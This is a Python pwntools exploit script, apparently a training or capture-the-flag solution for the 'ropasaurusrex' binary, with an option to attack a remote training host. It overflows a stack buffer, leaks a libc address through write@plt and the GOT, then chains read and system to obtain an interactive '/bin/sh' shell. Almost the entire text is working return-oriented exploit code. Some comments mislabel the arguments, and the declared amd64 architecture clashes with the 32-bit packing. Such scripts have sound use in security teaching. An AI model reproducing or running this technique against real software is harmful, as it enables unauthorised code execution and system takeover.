from pwn import *

context.arch="amd64"

LIBC_PATH = "./libc-2.39.so"
LIBC = ELF(LIBC_PATH)
CHALL_PATH = "./ropasaurusrex_patched"
CHALL = ELF(CHALL_PATH)

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./ropasaurusrex_patched")
        gdb.attach(c, """
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("ropasaurusrex.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./ropasaurusrex_patched")

#leak the position of LIBC
payload = b'A' * 268 #until the return address
payload += p32(CHALL.plt['write'])
payload += p32(CHALL.symbols['main']) #saved return address after calling write@plt, we restart the main
payload += p32(1) #number of bytes
payload += p32(CHALL.got['read']) 
payload += p32(4) 

c.recvuntil(b"Input: ")
c.sendline(payload)

libc_leak = c.recv(4)
LIBC.address = u32(libc_leak) - LIBC.symbols['read'] #last 3 nibbles must be to zero  

#call system with /bin/sh
ADD_ESP_12 = 0x0804901b #address of pop gadget
payload = b'A' * 268 
payload += p32(LIBC.symbols['read'])
payload += p32(ADD_ESP_12)
payload += p32(0)
payload += p32(0x804c300) #where we put '/bin/sh'
payload += p32(7) #number of bits of '/bin/sh'
payload += p32(LIBC.symbols['system'])
payload += p32(0xdeadbeef) #return address (not relevant)
payload += p32(0x804c300)

c.recvuntil(b"Input: ")
c.sendline(payload)
c.send(b'/bin/sh')

c.interactive()
